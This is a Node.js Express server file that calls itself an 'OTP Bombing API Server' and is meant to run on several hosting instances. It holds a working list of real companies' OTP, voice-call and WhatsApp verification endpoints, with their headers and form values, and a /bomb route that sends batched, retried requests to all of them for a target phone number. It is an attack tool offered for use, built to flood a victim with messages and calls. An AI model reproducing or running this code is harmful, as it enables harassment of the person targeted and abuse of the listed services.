// ============================================================
// api_server.js - OTP Bombing API Server
// Deploy this on 4 different Render instances
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============================================================
// ===== ALL APIS =====
// ============================================================

const API_CONFIGS = [
    {
        "name": "SalaryBolt",
        "method": "POST",
        "url": "https://backend.salarybolt.com/api/user/send-otp",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "origin": "https://salarybolt.com",
            "referer": "https://salarybolt.com/"
        },
        "data": {
            "PAN": "ABCDE1234F",
            "phone_number": "{phone}"
        },
        "phone_format": "raw"
    },
    {
        "name": "SabkaLoan",
        "method": "POST",
        "url": "https://api.sabkaloan.com/api/send-otp",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://sabkaloan.com",
            "Referer": "https://sabkaloan.com/"
        },
        "data": {
            "mobile": "{phone}"
        },
        "phone_format": "raw"
    },
    {
        "name": "RealEstateIndia_Call",
        "method": "POST",
        "url": "https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php",
        "headers": {
            "x-requested-with": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded"
        },
        "data": {
            "_raw": "action_id=call_to_otp&mob_num={phone}&member_id=1547045"
        },
        "phone_format": "raw"
    },
    {
        "name": "MagicBricks_Call",
        "method": "GET",
        "url": "https://api.magicbricks.com/bricks/verifyOnCall.html?mobile={phone}",
        "headers": {},
        "data": null,
        "phone_format": "raw"
    },
    {
        "name": "Career360_Call",
        "method": "POST",
        "url": "https://www.careers360.com/ajax/no-cache/user/otp-send",
        "headers": {
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded"
        },
        "data": {
            "_raw": "mobile_number={phone}&method=call&uid=12692588"
        },
        "phone_format": "raw"
    },
    {
        "name": "MamaEarth_WA",
        "method": "POST",
        "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
        "headers": {
            "Content-Type": "application/json"
        },
        "data": {
            "mobile": "{phone}"
        },
        "phone_format": "raw"
    },
    {
        "name": "Havells_WA",
        "method": "POST",
        "url": "https://havells.com/otplogin/account/otploginpost/",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        "data": {
            "_raw": "form_key=GvFYqgGVWCkuLoNT&mobile_number={phone}&is_whatsapp_promo=on"
        },
        "phone_format": "raw"
    },
    {
        "name": "HeroFinCorp_WA",
        "method": "POST",
        "url": "https://loans.apps.herofincorp.com/api/generateOtp",
        "headers": {
            "Content-Type": "application/json"
        },
        "data": {
            "phone": "{phone}",
            "terms": true,
            "whatsapp": true
        },
        "phone_format": "raw"
    }
];

// ===== VOICE APIS =====
const VOICE_APIS = [
    {
        name: "RealEstateIndia_Call",
        url: "https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php",
        method: "POST",
        headers: { 
            "x-requested-with": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded"
        },
        data: (phone) => `action_id=call_to_otp&mob_num=${phone}&member_id=1547045`,
        phone_format: "raw"
    },
    {
        name: "MagicBricks_Call",
        url: "https://api.magicbricks.com/bricks/verifyOnCall.html?mobile={phone}",
        method: "GET",
        headers: {},
        data: null,
        phone_format: "raw"
    },
    {
        name: "Career360_Call",
        url: "https://www.careers360.com/ajax/no-cache/user/otp-send",
        method: "POST",
        headers: {
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded"
        },
        data: (phone) => `mobile_number=${phone}&method=call&uid=12692588`,
        phone_format: "raw"
    }
];

// ===== WHATSAPP APIS =====
const WHATSAPP_APIS = [
    {
        name: "MamaEarth_WA",
        url: "https://auth.mamaearth.in/v1/auth/initiate-signup",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: phone }),
        phone_format: "raw"
    },
    {
        name: "Havells_WA",
        url: "https://havells.com/otplogin/account/otploginpost/",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: (phone) => `form_key=GvFYqgGVWCkuLoNT&mobile_number=${phone}&is_whatsapp_promo=on`,
        phone_format: "raw"
    },
    {
        name: "HeroFinCorp_WA",
        url: "https://loans.apps.herofincorp.com/api/generateOtp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: phone, terms: true, whatsapp: true }),
        phone_format: "raw"
    }
];

// ===== EXTRA APIS =====
const EXTRA_APIS = [
    {
        name: "SalaryBolt",
        url: "https://backend.salarybolt.com/api/user/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "origin": "https://salarybolt.com",
            "referer": "https://salarybolt.com/"
        },
        data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone }),
        phone_format: "raw"
    },
    {
        name: "SabkaLoan",
        url: "https://api.sabkaloan.com/api/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://sabkaloan.com",
            "Referer": "https://sabkaloan.com/"
        },
        data: (phone) => JSON.stringify({ mobile: phone }),
        phone_format: "raw"
    }
];

// ============================================================
// ===== MERGE ALL APIS =====
// ============================================================

const allApis = [...API_CONFIGS, ...VOICE_APIS, ...WHATSAPP_APIS, ...EXTRA_APIS];

// Remove duplicates
const seenUrls = new Set();
const uniqueApis = [];
for (const api of allApis) {
    const urlKey = typeof api.url === 'function' ? `dynamic_${api.name || 'unknown'}` : api.url;
    if (!seenUrls.has(urlKey)) {
        seenUrls.add(urlKey);
        uniqueApis.push(api);
    }
}

console.log(`✅ Loaded ${uniqueApis.length} unique APIs`);

// ============================================================
// ===== API CALL FUNCTION =====
// ============================================================

function makeFallbackData(phone, apiName) {
    const lower = apiName.toLowerCase();
    if (lower.includes('voice') || lower.includes('call')) {
        return JSON.stringify({ mobile: phone });
    }
    if (lower.includes('whatsapp') || lower.includes('wa')) {
        return JSON.stringify({ mobile: phone, channel: "whatsapp" });
    }
    return JSON.stringify({ mobile: phone });
}

async function makeApiCall(api, phone, retryCount = 0) {
    try {
        let url = api.url;
        if (typeof url === 'function') url = url(phone);
        else if (url.includes('{phone}')) url = url.replace(/{phone}/g, phone);

        const headers = { ...api.headers };
        delete headers['content-length'];
        delete headers['Content-Length'];
        delete headers['host'];
        delete headers['Host'];

        let data = null;
        let isRaw = false;

        if (api.data) {
            if (typeof api.data === 'function') {
                data = api.data(phone);
            } else if (api.data._raw) {
                let rawData = api.data._raw;
                if (typeof rawData === 'string') {
                    rawData = rawData.replace(/{phone}/g, phone);
                }
                data = rawData;
                isRaw = true;
            } else {
                data = JSON.parse(JSON.stringify(api.data));
                const replacePhone = (obj) => {
                    if (typeof obj === 'string') return obj.replace(/{phone}/g, phone);
                    if (Array.isArray(obj)) return obj.map(replacePhone);
                    if (typeof obj === 'object' && obj !== null) {
                        const newObj = {};
                        for (let key in obj) {
                            newObj[key] = replacePhone(obj[key]);
                        }
                        return newObj;
                    }
                    return obj;
                };
                data = replacePhone(data);
            }
        } else {
            data = makeFallbackData(phone, api.name);
        }

        const method = api.method.toLowerCase();
        const config = {
            method,
            url,
            headers,
            timeout: 3000,
        };

        if (method === 'post' || method === 'put') {
            if (isRaw || typeof data === 'string') {
                config.data = data;
                if (typeof data === 'string' && data.includes('=') && !data.startsWith('{')) {
                    headers['Content-Type'] = 'application/x-www-form-urlencoded';
                }
            } else {
                config.data = JSON.stringify(data);
                if (!headers['Content-Type']) {
                    headers['Content-Type'] = 'application/json';
                }
            }
        }

        const response = await axios(config);
        return { status: response.status, success: true };
    } catch (err) {
        if (retryCount < 2 && 
            (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ECONNABORTED')) {
            return makeApiCall(api, phone, retryCount + 1);
        }
        return { status: err.response?.status || null, success: false };
    }
}

// ============================================================
// ===== ROUTES =====
// ============================================================

app.get('/', (req, res) => {
    res.json({
        status: 'ok',
        instance: process.env.INSTANCE_NAME || 'api',
        apis: uniqueApis.length,
        uptime: process.uptime()
    });
});

app.post('/bomb', async (req, res) => {
    const { phone, duration, instance } = req.body;
    
    if (!phone || phone.length !== 10) {
        return res.status(400).json({ error: 'Invalid phone number. Must be 10 digits.' });
    }

    console.log(`📱 Bombing ${phone} | Duration: ${duration}min | Instance: ${instance || 'default'}`);

    try {
        const startTime = Date.now();
        let success = 0, smsCount = 0, callCount = 0, whatsappCount = 0;
        const apiList = uniqueApis;
        const BATCH_SIZE = 30;
        const BATCH_DELAY = 10;
        
        let maxRequests = 100;
        
        if (duration <= 1) {
            maxRequests = 200;
        } else if (duration <= 5) {
            maxRequests = 150;
        } else if (duration <= 10) {
            maxRequests = 100;
        } else if (duration <= 30) {
            maxRequests = 80;
        } else {
            maxRequests = 50;
        }

        const shuffled = [...apiList];
        for (let i = shuffled.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
        }

        let sent = 0;
        for (let i = 0; i < shuffled.length && sent < maxRequests; i += BATCH_SIZE) {
            const batch = shuffled.slice(i, Math.min(i + BATCH_SIZE, shuffled.length));
            
            const results = await Promise.allSettled(
                batch.map(api => makeApiCall(api, phone))
            );
            
            for (const result of results) {
                if (result.status === 'fulfilled' && result.value && result.value.success) {
                    success++;
                    sent++;
                    const apiName = batch[results.indexOf(result)]?.name || '';
                    if (apiName.toLowerCase().includes('call') || apiName.toLowerCase().includes('voice')) {
                        callCount++;
                    } else if (apiName.toLowerCase().includes('whatsapp') || apiName.toLowerCase().includes('wa')) {
                        whatsappCount++;
                    } else {
                        smsCount++;
                    }
                }
            }
            
            if (i + BATCH_SIZE < shuffled.length && sent < maxRequests) {
                await new Promise(r => setTimeout(r, BATCH_DELAY));
            }
        }

        const elapsed = (Date.now() - startTime) / 1000;
        
        res.json({
            success: true,
            phone,
            duration,
            instance: instance || 'default',
            totalSent: success,
            sms: smsCount,
            calls: callCount,
            whatsapp: whatsappCount,
            elapsed: elapsed.toFixed(1) + 's'
        });
        
    } catch (error) {
        console.error('Bombing error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/apis', (req, res) => {
    res.json({
        total: uniqueApis.length,
        instances: process.env.INSTANCE_NAME || 'api'
    });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 API Server running on port ${PORT}`);
    console.log(`📡 Instance: ${process.env.INSTANCE_NAME || 'default'}`);
    console.log(`📊 APIs loaded: ${uniqueApis.length}`);
});
